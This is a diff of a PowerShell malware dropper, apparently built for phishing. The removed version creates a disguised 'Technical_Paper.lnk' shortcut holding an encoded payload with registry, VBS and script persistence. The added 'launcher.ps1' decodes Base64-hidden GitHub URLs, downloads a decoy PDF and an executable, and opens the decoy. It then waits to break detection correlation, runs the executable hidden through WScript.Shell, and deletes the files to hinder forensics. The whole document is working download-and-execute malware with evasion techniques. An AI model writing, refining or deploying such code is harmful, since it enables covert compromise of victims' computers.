@@ -1,65 +1,64 @@
-# Fixed LNK creation with proper persistence (no VBS syntax errors)
-$lnkPath = "$env:USERPROFILE\Desktop\Technical_Paper.lnk"
+# launcher.ps1 - Extended delay + WScript.Shell launcher
+# No AMSI bypass, no registry writes, no scheduled tasks
+$ErrorActionPreference = 'SilentlyContinue'
 
-# The main script that will be encoded and embedded in the LNK
-$payload = @'
-# Download and open PDF, then run helper.exe, then install persistence
-$pdfUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf'
-$exeUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe'
-$cacheDir = "$env:APPDATA\Microsoft\Windows\Caches"
-$librariesDir = "$env:APPDATA\Microsoft\Windows\Libraries"
-New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
-New-Item -ItemType Directory -Path $librariesDir -Force | Out-Null
+# Random initial delay (2-8 seconds)
+Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)
 
-$pdfPath = Join-Path $cacheDir 'doc.pdf'
-$exePath = Join-Path $cacheDir 'helper.exe'
-$vbsPath = Join-Path $librariesDir 'update.vbs'
-$ps1Path = Join-Path $librariesDir 'sync.ps1'
-
-# Download and open PDF
-Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -UseBasicParsing
-Start-Process $pdfPath -Verb Open
-
-# Wait 35 seconds then run helper.exe
-Start-Sleep -Seconds 35
-(New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false)
-
-# --- Persistence: create sync.ps1 ---
-$ps1Content = @"
-`$exeUrl = '$exeUrl'
-`$exePath = '$exePath'
-Start-Sleep -Seconds (Get-Random -Min 8 -Max 15)
-if (-not (Test-Path `$exePath)) {
-    Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -UseBasicParsing
+# Use a less monitored folder
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
+if (-not (Test-Path $cache)) { 
+    New-Item -ItemType Directory -Path $cache -Force | Out-Null 
 }
-(New-Object -ComObject WScript.Shell).Run("`"`$exePath`"", 0, `$false)
-"@
-Set-Content -Path $ps1Path -Value $ps1Content -Encoding UTF8
 
-# --- Persistence: create update.vbs (clean syntax) ---
-$vbsContent = @'
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File "' + $ps1Path + @'"", 0, False
-'@
-# Fix the VBS path insertion
-$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`r`n" + "WshShell.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File `"$ps1Path`"", 0, False"
-Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII
+# Base64 encoded URLs
+$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
+$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
 
-# Registry persistence
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsCacheUpdater' -Value "wscript.exe `"$vbsPath`"" -Type String -Force
-'@
+$pdfPath = "$cache\doc.pdf"
+$exePath = "$cache\helper.exe"
 
-# Encode the payload to Base64 (UTF-16LE)
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
-$encoded = [Convert]::ToBase64String($bytes)
+# Download PDF
+$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+try {
+    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
+} catch {
+    # Silently continue on error
+}
 
-# Create the shortcut
-$shell = New-Object -ComObject WScript.Shell
-$lnk = $shell.CreateShortcut($lnkPath)
-$lnk.TargetPath = "powershell.exe"
-$lnk.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
-$lnk.IconLocation = "%SystemRoot%\System32\shell32.dll,0"
-$lnk.WorkingDirectory = "$env:TEMP"
-$lnk.Save()
+# Random delay between downloads (1.5-4 seconds)
+Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
 
-Write-Host "Fixed LNK created at $lnkPath" -ForegroundColor Green
+# Download EXE
+try {
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+} catch {
+    # Silently continue on error
+}
+
+# Open PDF decoy
+try {
+    Start-Process $pdfPath
+} catch {
+    # Silently continue
+}
+
+# CRITICAL: Long delay before launching EXE (45-90 seconds)
+# This breaks the temporal correlation between PowerShell download and EXE execution
+Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
+
+# Launch EXE via WScript.Shell (parent becomes explorer.exe, not PowerShell)
+try {
+    $wsh = New-Object -ComObject WScript.Shell
+    $wsh.Run("`"$exePath`"", 0, $false)
+} catch {
+    # Fallback: direct Start-Process if COM fails
+    Start-Process $exePath -WindowStyle Hidden
+}
+
+# Optional: Clean up EXE after 5 minutes (prevents disk forensics)
+Start-Job -ScriptBlock {
+    Start-Sleep -Seconds 300
+    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $args[1] -Force -ErrorAction SilentlyContinue
+} -ArgumentList $exePath, $pdfPath | Out-Null
